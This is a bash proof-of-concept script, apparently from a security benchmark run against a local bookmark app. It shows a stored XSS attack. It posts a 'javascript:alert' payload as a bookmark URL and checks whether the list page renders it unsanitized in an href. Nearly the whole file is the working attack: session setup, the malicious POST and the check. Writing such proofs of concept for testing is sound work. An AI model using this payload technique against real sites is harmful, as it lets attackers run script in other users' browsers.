#!/bin/bash
# POC: Demonstrates Stored XSS vulnerability by injecting javascript: protocol in URL field. The payload is stored and rendered without sanitization, making it executable when clicked.
# Target: ./repo
# Created: 2025-11-07T17:37:36.674Z
# Session: benchmark-XBEN-075-24-mhp4u83c

# Stored XSS via JavaScript Protocol Handler POC
# This script demonstrates a Stored XSS vulnerability where javascript: protocol handlers
# are accepted in URL fields and rendered without proper sanitization

TARGET_HOST="${1:-http://localhost:5000}"
COOKIE_JAR="/tmp/xss_cookies.txt"
PAYLOAD="javascript:alert('XSS')"

echo "[*] Stored XSS via JavaScript Protocol Handler POC"
echo "[*] Target: $TARGET_HOST"
echo ""

# Step 1: Initial page load to establish session
echo "[+] Step 1: Loading initial page to establish session..."
curl -s -c "$COOKIE_JAR" "$TARGET_HOST/list" > /dev/null 2>&1
echo "[✓] Session established"
echo ""

# Step 2: Submit malicious URL with javascript: protocol
echo "[+] Step 2: Submitting malicious bookmark with javascript: protocol..."
RESPONSE=$(curl -s -b "$COOKIE_JAR" -X POST "$TARGET_HOST/add" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=XSSTest&url=$PAYLOAD" \
  -c "$COOKIE_JAR")

echo "[✓] Payload submitted: $PAYLOAD"
echo ""

# Step 3: Retrieve the list page and check for stored XSS payload
echo "[+] Step 3: Retrieving list page to verify stored XSS..."
LIST_PAGE=$(curl -s -b "$COOKIE_JAR" "$TARGET_HOST/list")

# Check if the javascript: protocol is present in href attribute
if echo "$LIST_PAGE" | grep -q 'href="javascript:'; then
    echo "[✓✓✓] VULNERABILITY CONFIRMED!"
    echo ""
    echo "[!] The javascript: protocol handler is stored and rendered without sanitization"
    echo ""
    
    # Extract and display the vulnerable line
    echo "[!] Vulnerable HTML found:"
    echo "$LIST_PAGE" | grep -o '<a[^>]*href="javascript:[^"]*"[^>]*>[^<]*</a>' | head -1
    echo ""
    
    exit 0
else
    echo "[-] javascript: protocol not found in output"
    echo ""
    echo "[DEBUG] Full list page output:"
    echo "$LIST_PAGE"
    exit 1
fi